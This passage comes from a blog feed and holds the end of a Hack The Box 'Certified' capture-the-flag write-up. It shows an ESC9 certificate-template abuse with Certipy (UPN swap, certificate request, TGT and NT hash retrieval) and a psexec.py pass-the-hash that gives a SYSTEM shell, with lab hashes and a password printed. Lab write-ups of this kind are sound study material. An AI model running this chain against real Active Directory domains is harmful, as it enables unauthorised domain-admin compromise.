&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certificate Authorities
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CA Name : certified-DC01-CA
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Name : DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Subject : &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>certified-DC01-CA, &lt;span class="nv">DC&lt;/span>&lt;span class="o">=&lt;/span>certified, &lt;span class="nv">DC&lt;/span>&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Serial Number : 36472F2C180FBB9B4983AD4D60CD5A9D
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Validity Start : 2024-05-13 15:33:41+00:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Validity End : 2124-05-13 15:43:41+00:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Web Enrollment : Disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> User Specified SAN : Disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Request Disposition : Issue
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enforce Encryption &lt;span class="k">for&lt;/span> Requests : Enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Permissions
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Owner : CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrators
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Access Rights
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ManageCertificates : CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrators
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ManageCa : CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrators
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enroll : CERTIFIED.HTB&lt;span class="se">\A&lt;/span>uthenticated Users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certificate Templates
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Template Name : CertifiedAuthentication
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Display Name : Certified Authentication
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Authorities : certified-DC01-CA
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enabled : True
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Client Authentication : True
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enrollment Agent : False
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Any Purpose : False
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enrollee Supplies Subject : False
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Certificate Name Flag : SubjectRequireDirectoryPath
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SubjectAltRequireUpn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enrollment Flag : NoSecurityExtension
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> AutoEnrollment
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PublishToDs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Private Key Flag : &lt;span class="m">16842752&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Extended Key Usage : Server Authentication
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Client Authentication
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Requires Manager Approval : False
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Requires Key Archival : False
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Authorized Signatures Required : &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Validity Period : &lt;span class="m">1000&lt;/span> years
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Renewal Period : &lt;span class="m">6&lt;/span> weeks
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Minimum RSA Key Length : &lt;span class="m">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Permissions
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enrollment Permissions
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Enrollment Rights : CERTIFIED.HTB&lt;span class="se">\o&lt;/span>perator ca
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Object Control Permissions
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Owner : CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Write Owner Principals : CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Write Dacl Principals : CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Write Property Principals : CERTIFIED.HTB&lt;span class="se">\D&lt;/span>omain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\E&lt;/span>nterprise Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CERTIFIED.HTB&lt;span class="se">\A&lt;/span>dministrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Vulnerabilities
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ESC9 : &lt;span class="s1">&amp;#39;CERTIFIED.HTB\\operator ca&amp;#39;&lt;/span> can enroll and template has no security extension
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This &lt;a class="link" href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" target="_blank" rel="noopener"
>Blog&lt;/a> guided me through that, and as it said the Requisites is &lt;code>GenericWrite&lt;/code> over any account A to compromise any account B.&lt;/p>
&lt;p>To perform this attack we will need the password hash of the &lt;code>ca_operator&lt;/code> which is below (I used this &lt;a class="link" href="https://codebeautify.org/ntlm-hash-generator" target="_blank" rel="noopener"
>Website&lt;/a> to hash the password &lt;code>S3cur3P@ssw0rd!&lt;/code>)&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">D5915E565671E06FD6D67A460D59583E
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Next, we change the &lt;code>userPrincipalName&lt;/code> of &lt;code>ca_operator&lt;/code> to be &lt;code>Administrator&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Updating user &lt;span class="s1">&amp;#39;ca_operator&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> userPrincipalName : administrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully updated &lt;span class="s1">&amp;#39;ca_operator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now, we request the vulnerable certificate template &lt;code>CertifiedAuthentication&lt;/code>. We must request the certificate as &lt;code>ca_operator&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo certipy-ad req -username ca_operator@certified.htb -hashes D5915E565671E06FD6D67A460D59583E -ca certified-DC01-CA -template CertifiedAuthentication -debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to resolve &lt;span class="s1">&amp;#39;CERTIFIED.HTB&amp;#39;&lt;/span> at &lt;span class="s1">&amp;#39;192.168.1.254&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Resolved &lt;span class="s1">&amp;#39;CERTIFIED.HTB&amp;#39;&lt;/span> from cache: 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Generating RSA key
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting certificate via RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to connect to endpoint: ncacn_np:10.10.11.41&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Connected to endpoint: ncacn_np:10.10.11.41&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully requested certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Request ID is &lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got certificate with UPN &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate has no object SID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved certificate and private key to &lt;span class="s1">&amp;#39;administrator.pfx&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>That gave us a &lt;code>administrator.pfx&lt;/code> certificate, which can be used to authenticate to the Domain Controller as Administrator.&lt;/p>
&lt;p>We must then change the &lt;code>ca_operator&lt;/code> back to its original &lt;code>UPN&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Updating user &lt;span class="s1">&amp;#39;ca_operator&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> userPrincipalName : ca_operator@certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully updated &lt;span class="s1">&amp;#39;ca_operator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Let&amp;rsquo;s now get the &lt;code>Administrator&lt;/code>&amp;rsquo;s TGT and his NTLM hash&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo ntpdate 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-17 03:05:40.599937 &lt;span class="o">(&lt;/span>+0100&lt;span class="o">)&lt;/span> +35785.588485 +/- 0.074389 10.10.11.41 s1 no-leap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CLOCK: &lt;span class="nb">time&lt;/span> stepped by 35785.588485
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using principal: administrator@certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get TGT...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved credential cache to &lt;span class="s1">&amp;#39;administrator.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to retrieve NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator@certified.htb&amp;#39;&lt;/span>: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Finally, I used &lt;code>psexec.py&lt;/code> to get a shell as the &lt;code>Administrtaor&lt;/code> user.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>─&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/…/HTB/Certified/CA/C!&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ psexec.py &lt;span class="s1">&amp;#39;certified.htb/Administrator@10.10.11.41&amp;#39;&lt;/span> -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting shares on 10.10.11.41.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found writable share ADMIN$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Uploading file fVKmJzkE.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Opening SVCManager on 10.10.11.41.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Creating service bRER on 10.10.11.41.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting service bRER.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Press &lt;span class="nb">help&lt;/span> &lt;span class="k">for&lt;/span> extra shell commands
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Microsoft Windows &lt;span class="o">[&lt;/span>Version 10.0.17763.6414&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> &lt;span class="m">2018&lt;/span> Microsoft Corporation. All rights reserved.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nt authority&lt;span class="se">\s&lt;/span>ystem
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; &lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; dir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume in drive C has no label.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume Serial Number is EA74-A0A7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory of C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10/22/2024 01:15 PM &amp;lt;DIR&amp;gt; .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10/22/2024 01:15 PM &amp;lt;DIR&amp;gt; ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/16/2025 07:42 PM &lt;span class="m">34&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> &lt;span class="m">34&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> Dir&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> 5,238,980,608 bytes free
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fbb7b2015f20279c3bccc2794b2c5ec0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Administrator HTB Writeup</title><link>https://r4z1o.github.io/p/administrator-htb-writeup/</link><pubDate>Sat, 22 Feb 2025 00:00:00 +0000</pubDate><guid>https://r4z1o.github.io/p/administrator-htb-writeup/</guid><description>&lt;img src="https://r4z1o.github.io/p/administrator-htb-writeup/Administrator.png" alt="Featured image of post Administrator HTB Writeup" />&lt;h2 id="nmap-scan-">Nmap Scan :
